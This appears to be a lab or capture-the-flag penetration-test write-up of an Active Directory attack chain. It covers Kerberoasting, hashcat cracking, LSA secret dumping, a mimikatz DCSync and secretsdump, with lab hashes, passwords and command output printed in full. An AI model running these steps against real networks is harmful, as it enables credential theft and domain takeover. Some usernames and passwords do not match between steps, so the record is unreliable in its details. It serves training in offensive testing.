The tester proceeded to enumerate user accounts configured with Service Principal Names (SPNs) that may be subject to a Kerberoasting attack, a lateral movement/privilege escalation technique that targets SPNs which are unique identifiers that Kerberos uses to map a service instance to a service account. Any domain user can request a Kerberos ticket for any service account in the domain and the ticket is encrypted with the service account's NTLM password hash, which can potentially be "cracked" offline to reveal the account's clear text password value.\
```shell-session
$GetUserSPNs.py INLANEFREIGHT.LOCAL/wley -dc-ip 172.16.5.5

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation



Password:

ServicePrincipalName                           Name               MemberOf                                                   PasswordLastSet             LastLogon  Delegation 

---------------------------------------------  -----------------  ---------------------------------------------------------  --------------------------  ---------  ----------

sts/inlanefreight.local                        solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:11:38.041017  <never>               

MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL         2022-06-01 23:11:50.431638  <never>               

MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:12:06.009772  <never>               

vmware/inlanefreight.local                     svc_vmwaresso                                                                 2022-06-01 23:13:09.494156  <never>               

SAPService/srv01.inlanefreight.local           SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:13:25.041019  <never>
```

The tester then ran the Python version of the popular BloodHound Active Directory enumeration tool to collect information such as users, groups, computers, ACLs, group membership, user and computer properties, user sessions, local admin access, and more. This data can then be imported into a GUI tool to create visual representations of relationships within the domain and map out "attack paths" that can be used to potentially move laterally or escalate privileges within a domain.
```shell-session
$sudo bloodhound-python -u 'wley' -p 'Cargonet2' -d inlanefreight.local -ns 172.16.5.5 -c All
INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 562 computers
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
WARNING: Could not resolve SID: S-1-5-21-3842939050-3880317879-2865463114-4115
INFO: Found 2955 users
```

The tester used this tool to check privileges for each of the SPN accounts enumerated earlier and noticed that only the solarwindsmonitor account had any privileges beyond a standard domain user. This account is a member of the Domain Admins group.
![[Pasted image 20240710111858.png]]


The tester then performed a targeted Kerberoasting attack to retrieve the Kerberos TGS ticket for the solarwindsmonitor service account.
```shell-session
# /usr/share/doc/python3-impacket/examples/GetUserSPNs.py INLANEFREIGHT.LOCAL/wley -dc-ip 172.16.5.5 -request-user solarwindsmonitor

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>

ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-06-02 06:12:06.009772  <never>     

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$a7d5df73f64e1ce12a5b7df6cd50da5b$80caea4ba91c50f9ca87a9b16ef140f39236fcf0aa6277f819682c86479eaa28d21c0c3630c70d02c66ca2759bf5c3e9ad459a9c5bf04a54f5ca988508b79e3ae3a1a3efd2eb5567fab479a318d294418df1e6f3f7e2b75e7a3a7d84adc42b71aa606e138c48b633a9f8cb0ea4e571ae8d7aadc28f07afc5975ed228f5e5c3f038f042c17878b76cc6277da13631502d6e38728da07cb34424aee32cabc208b2024405d4a2b0d1f23a93cb688c85366c6c11634ded328a252176f9155a2b0549b5281c5a0cf7ac2fbc6f13a7a1d21f10a0c5a5b5f5177670421c6b762f5874ae7bb2ee6660860e995f4b89f42e42f9147a67d03e14cd225c47cfa6cebb438e78a9eda488ecba3d1e2c884744de434ffe64966d9a298f2f3e84f167fb5dc13e20f003c0dc5d937ee2db1b2727fd7e46c63c2aeaf5c265806e3dfb174740e86ed322e0617c76c4ee4cac611cee1a9ddd26bff871ecdb4775e660f7846371c0b1aaa2defd2a987069bfc69990583d5fbadf19c77d68090f82dff0ab4dab099a358a17b716b88c0e4cd5d5dbe47edd476348b1c8d9fb37f1bcfd4ee85bdfe72469ae760daf4e2cc44e79a6c3d10a558e8e88d353b3186f4c78b8f1f1ceed718380c60c1dce37773f10c7ddaa744c7104fe1a906694b14ed8aadd2944bf131d6d0b8ad070fc0875a40fa9c78f2a685efb4a5e92dcb06ac7ca77c6c8f5fe7ca5dfadf156658f0485159d8f2804eaee177f6831a4e6d5b90a7b3c632d0d26975a7c20ae3dd096c55df50f76e2e38f900b74ed4c9107023d21be8174cc09aa96522ec22e0111a2e0ed1a25af0d076f8fbaccfd046b17dfab694c5405d728b9d9b4ea3fac435298b59ddc39be13881b2a20d1e9bfe8365ce1989ee64be37c246ac64c0c6771acc2942d74e4d7243e788f2897fc4e7cdf9794f596fa1a531dc0d016fbbb10959fdc6d1fa7f653f9eafeb1bce80cc144fb3296ecd8baadb2708663dfd460715635f920e002b6d6b21549b257934f243fc13eb87c8f1f842af3c5dd495c3e4eb61bdfb7e68639f20322fa0ff75ad888e46af2926bbdea7c7f642c0fe1ff3e4a57ed9c42afe7d27a8a86ea242529a1b21f420ae3d9cf0a2ade83d61ea81eed063b23e22cf4a7f9ca80035f9e78a33eb5942cc34c94c3ae31647e948caa26503e57176de4bc6e986ddeee2bb5ae86ccf2d8befb2433ff19bea7ec165860ad828db597b02e5401e414783ecb4131ae715575d9de7ad577ace4ea705391cc932ef9e35258f416722c3032709a11f6611185a9651c7f82d38115db3487665f6036015dae171e17525860e8d35d04f390a61aae8662142146035ed0746ccad2b12c2bf1121a34c7cc1e13dced9ac3c19e7d343be7172bcd91cbcb3c202e8c70050690801af3f402a462274f417c4dcd9e2c8d
```

The tester was able to successfully "crack" this password offline to reveal its clear text value.
```shell-session
# hashcat -m 13100 solarwindsmonitor_tgs /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$08b1dff06b11854766d48def6d5d46e3$b535d5668079ab65d4c0ef66e35b5662fbba6376df6b4592637f3691fd6888eee5b4422bc6328cc9cdb7387c50db7bfce3529409a341841c368188ad13194a6add3bbc155943859ab38489e277901c996d51bf78e9a0202252285e096e0c59d0c54038356d3e1ce7fbfd69291e72bd225a51c3dabee690dcbd5d9ec94328e842bdcf21fe8fc5f282bac356a4f912e1a48ddeb3a686ae4c2a944a89a03a90f630aea8c19570248c14ae31394de7ae952b26b5af858f0c4a771d6409fe946b4d8fef0c7acce1f6f842252887c67a00f713bbe7db2996776ca5697e006325e0991e2ca15f0276c82f797296841f86917935664b2428961703f5cd9c0f6568bfacc99994c71a5ebbf729c99344c57b99359ada58a3888e6a93c98dd3c248173249822c460f9e5222b7187f047522c9c1516e90e55a5a312c12ab0aa4ba646c7dd3586ee4eb4e4435a3bb36458d27d01813726d8cc91db694375c581fbfd89c92097a70e2b40e844cbea770876bdb00f4719a47671cd56d1bc691f83bbaf56e23da1390930a4b882cab742867e46902bfeef0a48d42feaf7f112ed0adc91801e0af59c6c55bc69c13eaaa845c081b3b586395f05b9e42a871bffcec1b7b66dad15b4c31c6895b6fb589dd047d6df3d8e810d24b12239ead6ccc1d70bbbaa6550f36fb3100069826095d701d9a0df342d5bdbccd683293e9255365f3e941244e91ea602f05edff920656068c5472f73c1ca053c12f86832cecb127561c6ffbe4a78bed03aeb467f0e3ff6d9776180adaf1b8cd491986843b9e861d44c84c255eadb129686b277afd0595e30224cb82a9be45b5429993d1352bae33aff20ffe9328c3434240cb9fd22a7305addadf109491a9779c0932640628d3bc1f6e10c5aa6505550bceb17c298630334db689fbfaf943a368847db0a0d016aae6b45232f271d086b54c4dbd45376dd51143d56a8d39b6535233ec67f03186a183cecfdc5c86426da5384edf15e2fa6daaa34f0939c5c0c889983ec23f3999bf33f750746c5603fa8205d2f32dbd7ce80b4d3083b57888b10cd854d49667a4e109583efd5c65fe9e905161e03897615e179174f6c5886f7412abb73bc10ac9810f508984aed5e6c54da909bb3dd0306b44471a244408bf264cff3483f97fb9e73fb680b3d6d8216a0878b552cbbf6ca45246aff1bed7ef56db45b397ea927b9d0bbbf9d037ac44a4725b560404433f4c42ea738762a4b0ccdfce3eec5a84a065b5b7635563f6088ecc313e55dd3d2f0e34d6206a1007cde3493abfaf33454f62dfff863d61325c4db47aa26b9c7dc9a1cff5c6e7d90f7d9d5e44c45304092216662f792b05a77cd0b0c96a7a6d61866e62935f95a99f202a813cad06e3e4270cc3432a59fa2b2d1c0c77ff9d0d6e9eae6cc6f4081c799f86:Sap82696
```

This password could be used to access the file01 host remotely and retrieve a set of clear text credentials from the registry for the srvadmin account.
```shell-session
# crackmapexec smb 172.16.5.130 -u solarwindsmonitor -p Solar1010 --lsa

SMB         172.16.5.130    445    FILE01           [*] Windows 10.0 Build 17763 x64 (name:FILE01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)

<SNIP>

SMB         172.16.5.130    445    FILE01           [+] Dumping LSA secrets
SMB         172.16.5.130    445    FILE01           INLANEFREIGHT.LOCAL/lab_adm:$DCC2$10240#lab_adm#83abcbfcaf736be6e7075096668df045: (2024-07-10 06:09:49)                                 

<SNIP>

NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63  
SMB         172.16.5.130    445    FILE01           INLANEFREIGHT\lab_adm:Academy_labadm_AD_adm!
SMB         172.16.5.130    445    FILE01           [+] Dumped 24 LSA secrets to /root/.cme/logs/FILE01_172.16.5.130_2024-07-10_112944.secrets and /root/.cme/logs/FILE01_172.16.5.130_2024-07-10_112944.cached
```

With those credentials the tester was able to login to the DC and retrieve the flag from the Administrator desktop:
`d0c_pwN_r3p0rt_reP3at!`

The tester then utilized this access to perform a DCSync attack and retrieve the NTLM password hash for the krbtgt account.
```cmd
PS C:\Users\lab_adm> .\mimikatz.exe



  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36

 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)

 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )

 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz

 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )

  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/



mimikatz # lsadump::dcsync /user:INLANEFREIGHT\krbtgt

[DC] 'INLANEFREIGHT.LOCAL' will be the domain

[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server

[DC] 'INLANEFREIGHT\krbtgt' will be the user account



Object RDN           : krbtgt



** SAM ACCOUNT **



SAM Username         : krbtgt

Account Type         : 30000000 ( USER_OBJECT )

User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )

Account expiration   :

Password last change : 10/27/2021 10:14:34 AM

Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-502

Object Relative ID   : 502



Credentials:

  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc

    ntlm- 0: 16e26ba33e455a8c338142af8d89ffbc

    lm  - 0: 4562458c201a97fa19365ce901513c21



Supplemental Credentials:

* Primary:NTLM-Strong-NTOWF *

    Random Value : 136862705dc94f5d2d6b152340982789



* Primary:Kerberos-Newer-Keys *

    Default Salt : INLANEFREIGHT.LOCALkrbtgt

    Default Iterations : 4096

    Credentials

      aes256_hmac       (4096) : 69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d

      aes128_hmac       (4096) : a4269293eda9e514fa711f84c090f205

      des_cbc_md5       (4096) : b5e5c1f1c1980edc



* Primary:Kerberos *

    Default Salt : INLANEFREIGHT.LOCALkrbtgt

    Credentials

      des_cbc_md5       : b5e5c1f1c1980edc



* Packages *

    NTLM-Strong-NTOWF



* Primary:WDigest *

    01  f0611a8949271e064979732b49430ac7

    02  f22fe7e5d4d915978110742104d893c4

    03  90461b36096edcc86533eb9af35dac37

    04  f0611a8949271e064979732b49430ac7

    05  f22fe7e5d4d915978110742104d893c4

    06  51bb66077c7bcb21078c8d5c66dd1fa4

    07  f0611a8949271e064979732b49430ac7

    08  d156caaece3b4be0cf90b98ac1cdddeb

    09  bb4d61c79aa69cd15940f82f63212485

    10  7923da4df00f1d6fb33e2a7297cb65e4

    11  d156caaece3b4be0cf90b98ac1cdddeb

    12  bb4d61c79aa69cd15940f82f63212485

    13  a0bfdb56b1594aa570d6da7d579e9dc9

    14  d156caaece3b4be0cf90b98ac1cdddeb

    15  a7188cc1ed7c08e2b3e502fa080503c3

    16  50d59f12f7266c821651851190193588

    17  c95db18833def9b0c0249344e4283f6c

    18  b93ea36d1e1b0dd7beebabd536435116

    19  46ed0e0bf34cbed136522d9851f1cbff

    20  438953cbb2d58fe417359649e8431fd8

    21  6fdf189e1e7a86129d845460c27e4658

    22  6fdf189e1e7a86129d845460c27e4658

    23  9540f3c56cffde871b5e67157cd78e07

    24  44573694618059bd8050f512066a22ce

    25  0dc236bc4740579da5e95805ad71a791

    26  a4b0fa9bf1c0383a7e479697c945ae1d

    27  a8c8a5f56e51785ac77a4a27fc551a6d

    28  f601b5b0ada8186700b4b890da99dd12

    29  e48397c964c442f4d19e198577724d20
```

Did the same for administrator.

Dumping domain credentials:
```shell-session
$secretsdump.py inlanefreight/administrator@172.16.5.5 -hashes 4625fd0c31368ff4c255a3b876eaac3d:88ad09182de639ccc6579eb0849751cf -just-dc-ntlm

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation



[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)

[*] Using the DRSUAPI method to get NTDS.DIT secrets

inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::

guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::

lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::

inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::

inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

inlanefreight.local\pfalcon:1113:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::

inlanefreight.local\fanthony:1114:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::

inlanefreight.local\wdillard:1115:aad3b435b51404eeaad3b435b51404ee:69ada25bbb693f9a85cd5f176948b0d5:::

inlanefreight.local\lbradford:1116:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

inlanefreight.local\sgage:1117:aad3b435b51404eeaad3b435b51404ee:143304256bb8919b74cecf236d38829a:::

inlanefreight.local\asanchez:1118:aad3b435b51404eeaad3b435b51404ee:c6885c0fa57ec94542d362cf7dc2d541:::

inlanefreight.local\dbranch:1119:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::

inlanefreight.local\ccruz:1120:aad3b435b51404eeaad3b435b51404ee:a9be3a88067ed776d0e2cf4ccde8ec8f:::

inlanefreight.local\njohnson:1121:aad3b435b51404eeaad3b435b51404ee:1b2a9f3b6d785e695aadfe3485a2601f:::

inlanefreight.local\mholliday:1122:aad3b435b51404eeaad3b435b51404ee:143304256bb8919b74cecf236d38829a:::

inlanefreight.local\mshoemaker:1123:aad3b435b51404eeaad3b435b51404ee:c15d04d9a989b3c9f1d2db979ffa325f:::

<SNIP>
```
